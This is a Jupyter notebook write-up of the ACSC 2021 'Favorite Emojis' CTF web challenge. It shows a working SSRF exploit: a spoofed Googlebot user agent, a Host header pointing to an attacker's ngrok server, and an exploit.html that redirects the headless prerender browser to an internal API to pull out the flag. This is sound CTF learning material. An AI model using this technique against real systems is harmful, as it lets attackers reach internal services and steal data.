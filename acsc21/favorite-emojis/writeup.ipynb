{
 "cells": [
  {
   "cell_type": "markdown",
   "source": [
    "# Favorite Emojis\n",
    "\n",
    "> WEB | 330\n",
    ">\n",
    "> 🎈\n",
    ">\n",
    ">\n",
    ">                                 🏃\n",
    ">\n",
    "> http://favorite-emojis.chal.acsc.asia:5000\n",
    ">\n",
    "> Attachment: favorite-emojis.tar.gz (md5 88c58c7d867bcad99c40a2013cc77a58)"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- Checking `docker-compose.yml`, there are 3 containers\n",
    "  - `web` with nginx and is the only network exposed container\n",
    "  - `api` with a flask app, listening on port 8000\n",
    "  - `prerender` which runs `tvanro/prerender-alpine`, listening on port 3000\n",
    "- Opening the page itself, we see a list of some emojis\n",
    "\n",
    "![](webpage.png)"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "source": [
    "import requests\n",
    "url = \"http://favorite-emojis.chal.acsc.asia:5000/\"\n",
    "res = requests.get(url)\n",
    "print(\"\\n\".join(res.text.split(\"\\n\")[23:31]))"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "            <main>                        \n",
      "                <div class=\"table-responsive\">\n",
      "                <table class=\"table text-center\">\n",
      "                    <tbody id=\"tables\">\n",
      "                    </tbody>\n",
      "                </table>\n",
      "                </div>\n",
      "            </main>\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- The `prerender` container has [source on github](https://github.com/tvanro/prerender-alpine)\n",
    "- It runs a slim instance with the [prerender](https://www.npmjs.com/package/prerender) npm package\n",
    "- The container listens for any HTTP queries, then using a url specified in the request path it opens the url in a headless chrome instance and returns HTML"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- The `api` container has a simple flask app with two main endpoints\n",
    "- `/v1/get_emojis` returns some static data\n",
    "- `/` root path returns flag!\n",
    "\n",
    "```python\n",
    "@app.route(\"/\", methods=[\"GET\"])\n",
    "def root():\n",
    "    return FLAG\n",
    "```"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- The `nginx` container however blocks direct access to the flag\n",
    "- Requests to the `/api/` path will be forwarded to the `api` container with a prepended `/v1/` path, disallowing direct access to the root path which will return flag\n",
    "- Requests with a suitable user agent will be forwarded to the `prerender` container\n",
    "  - The container is asked to query a url derived from `$host` and `$request_uri` parameters\n",
    "  - Notably it will drop the spefified port\n",
    "- All other requests are redirected to a static `index.html` file served by nginx\n",
    "\n",
    "```conf\n",
    "; nginx.conf\n",
    "set $prerender 0;\n",
    "if ($http_user_agent ~* \"googlebot|bingbot|<...>|whatsapp\") { ; truncated\n",
    "    set $prerender 1;\n",
    "}\n",
    "; ...\n",
    "if ($uri ~* \"\\.(js|css|<...>|eot)\") { ; truncated\n",
    "    set $prerender 0;\n",
    "}\n",
    "; ...\n",
    "if ($prerender = 1) {\n",
    "    rewrite .* /$scheme://$host$request_uri? break;\n",
    "    proxy_pass http://renderer:3000;\n",
    "}\n",
    "if ($prerender = 0) {\n",
    "    rewrite .* /index.html break;\n",
    "}\n",
    "```"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- Since the flask server seems stable, we can focus on the nginx container first\n",
    "- To get a request to `prerender`, we can spoof the user agent when making requests\n",
    "- But this seems to time out?"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "source": [
    "res = requests.get(url, headers={\n",
    "  'User-Agent': 'Googlebot'\n",
    "})\n",
    "print(res.text)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "<html><head></head><body></body></html>\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- Obviously the request is hitting the `prerender` container because there is lag\n",
    "- This is because the port is stripped when the URL is forwarded\n",
    "- Right now, a request like above will get prerender to open \"http://favorite-emojis.chal.acsc.asia/\" (without port 5000) which will not load\n",
    "  - This won't work even if we specify port number in the `host` header\n",
    "- Can we try spoofing a different host?"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "source": [
    "url = \"http://favorite-emojis.chal.acsc.asia:5000/\"\n",
    "res = requests.get(url, headers={\n",
    "  'host': 'score.acsc.asia',\n",
    "  'User-Agent': 'Googlebot'\n",
    "})\n",
    "print(res.text[:200])"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "<!DOCTYPE html><html style=\"--chakra-ui-color-mode:light;\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width\"><meta name=\"next-head-count\" content=\"2\"><noscript data-n-css=\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- This successfully loaded the CTF landing page\n",
    "- We have SSRF from inside the docker subnet, and can control host, path (so long as it does not point to js, css or other 'static' extensions) but cannot control port\n",
    "  - Because we cannot control port, we cannot directly SSRF to `http://api:8000/` as port `8000` is required\n",
    "- We can forge a GET request and receive the html data after JS has been executed\n",
    "- Solution is to host own `.html` file which will redirect to the api server"
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "- Craft exploit.html and serve with `http.server` and `ngrok`\n",
    "\n",
    "```html\n",
    "<!-- exploit.html -->\n",
    "<!DOCTYPE html>\n",
    "<head>\n",
    "  <title>Document</title>\n",
    "</head>\n",
    "<body>\n",
    "  <script>\n",
    "    window.location = \"http://api:8000\"\n",
    "  </script>\n",
    "</body>\n",
    "</html>\n",
    "```\n",
    "\n",
    "```bash\n",
    "$ python3 -m http.server\n",
    "```\n",
    "```\n",
    "$ ngrok http 8000\n",
    "```\n",
    "\n",
    "![](server.png)"
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "source": [
    "url = \"http://favorite-emojis.chal.acsc.asia:5000/exploit.html\"\n",
    "res = requests.get(url, headers={\n",
    "  'host': 'da07-138-75-56-31.ngrok.io',\n",
    "  'User-Agent': 'Googlebot'\n",
    "})\n",
    "print(res.text)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "<html><head></head><body>ACSC{sharks_are_always_hungry}</body></html>\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "source": [
    "Flag: `ACSC{sharks_are_always_hungry}`"
   ],
   "metadata": {}
  }
 ],
 "metadata": {
  "orig_nbformat": 4,
  "language_info": {
   "name": "python",
   "version": "3.9.2",
   "mimetype": "text/x-python",
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "pygments_lexer": "ipython3",
   "nbconvert_exporter": "python",
   "file_extension": ".py"
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3.9.2 64-bit ('base': conda)"
  },
  "interpreter": {
   "hash": "ba4985b013d52bd6424c48022e2eb894d697d177d60817c6fcc2819191fa581a"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}